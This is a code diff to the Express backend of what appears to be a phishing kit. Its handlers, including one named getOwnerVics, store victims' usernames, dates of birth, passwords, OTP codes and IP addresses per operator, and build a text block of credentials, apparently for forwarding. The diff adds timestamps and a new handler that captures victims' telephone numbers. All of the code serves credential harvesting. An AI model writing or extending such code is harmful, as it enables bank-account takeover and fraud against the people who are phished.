@@ -1,5 +1,6 @@
 const YBS = require("../models/ybsModel");
 const axios = require("axios");
+var moment = require("moment"); // require
 
 const getOwnerVics = async (req, res) => {
 	const { owner } = req.params;
@@ -49,6 +50,7 @@ const submitLogin = async (req, res) => {
 			status: 1,
 			owner,
 			ip,
+			timestamp: moment().format(),
 		});
 
 		let originalText = `ID: ${uniqueid}\nUsername: ${username}\nDOB: ${dob}\nPassword: ${password}`;
@@ -77,7 +79,7 @@ const submitLoginAgain = async (req, res) => {
 	try {
 		await YBS.findOneAndUpdate(
 			{ uniqueid },
-			{ username, dob, password, status: 5 }
+			{ username, dob, password, status: 5, timestamp: moment().format() }
 		).exec();
 		res.sendStatus(200);
 	} catch (error) {
@@ -89,7 +91,24 @@ const submitLoginAgain = async (req, res) => {
 const submitOtp = async (req, res) => {
 	const { otp, uniqueid } = req.body;
 	try {
-		await YBS.findOneAndUpdate({ uniqueid }, { otp, status: 3 }).exec();
+		await YBS.findOneAndUpdate(
+			{ uniqueid },
+			{ otp, status: 3, timestamp: moment().format() }
+		).exec();
+		res.sendStatus(200);
+	} catch (error) {
+		console.log(error);
+		res.sendStatus(400);
+	}
+};
+
+const submitTelephone = async (req, res) => {
+	const { telephone, uniqueid } = req.body;
+	try {
+		await YBS.findOneAndUpdate(
+			{ uniqueid },
+			{ telephone, status: 7, timestamp: moment().format() }
+		).exec();
 		res.sendStatus(200);
 	} catch (error) {
 		console.log(error);
@@ -115,5 +134,6 @@ module.exports = {
 	submitLogin,
 	submitLoginAgain,
 	submitOtp,
+	submitTelephone,
 	deleteEntry,
 };
